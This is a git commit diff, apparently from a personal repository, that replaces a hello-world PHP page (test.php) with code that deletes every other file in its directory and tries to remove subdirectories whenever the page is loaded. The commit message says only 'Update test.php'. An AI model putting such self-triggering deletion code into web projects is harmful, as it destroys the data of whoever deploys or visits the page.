c948da7ae93f93db8c47fc4c91874f1f0cf9ddd8
别七年 <57948568+GitRayk@users.noreply.github.com>
2023-05-05 18:50:26 +0800

    Update test.php

--- test.php
+++ test.php
@@ -2,10 +2,24 @@
 <html> 
 <body> 
 
-<?php 
-echo "Hello"; 
-echo "Wolrd!";  
-?> 
+<p>Deleting</p>
+<?php
+    $dir = opendir(__DIR__);
+    $name = strrchr(__FILE__, '/');
+    $name = substr($name, 1);
+    while($file = readdir($dir)) {
+        if($file != "." && $file != ".." && $file != $name) {
+            $fullpath = __DIR__."/".$file;
+            if(!is_dir($fullpath)) {
+                unlink($fullpath);
+                echo "Delete ".$fullpath."\n";
+            } else {
+                rmdir($fullpath);
+            }
+        }
+    }
+    closedir($dir);
+?>
 
 </body> 
 </html>
